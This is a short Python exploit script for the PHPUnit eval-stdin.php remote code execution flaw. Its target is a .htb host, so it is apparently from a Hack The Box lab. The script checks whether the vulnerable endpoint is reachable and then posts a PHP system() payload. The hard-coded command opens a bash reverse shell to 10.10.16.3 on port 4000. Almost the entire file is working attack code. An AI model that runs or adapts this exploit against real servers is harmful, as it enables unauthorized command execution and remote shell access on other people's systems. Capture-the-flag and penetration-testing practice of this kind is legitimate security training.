import requests

def checkExploitable(url):
    exploit_url = url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    r = requests.get(exploit_url)
    if r.status_code == 200:
        return True
    else:
        return False

def exploit(url, command):
    exploit_url = url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
    }
    print("[+] Crafting payload...")
    data = '<?php system("{command}");?>'.format(command=command)
    print("[+] Payload: {data}".format(data=data))
    resp = requests.get(exploit_url, headers=headers, data=data, verify=False)
    print("[+] Sending requests...")
    output = resp.text.strip()
    if output == "":
        print("[+] Exploit completed!")
    else:
        print("[+] Output obtained: {output}".format(output=output))
        print("[+] Exploit completed!")

def main(url, command):
    if checkExploitable(url) == True:
        print("[+] {url} is exploitable!".format(url=url))
        exploit(url, command)
    else:
        print("[!] {url} is not exploitable!".format(url=url))
    #print(checkExploitable(url))

if __name__ == '__main__':
    url = "http://store.djewelry.htb"
    #command = "whoami"
    command = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/4000 0>&1'"
    main(url, command)
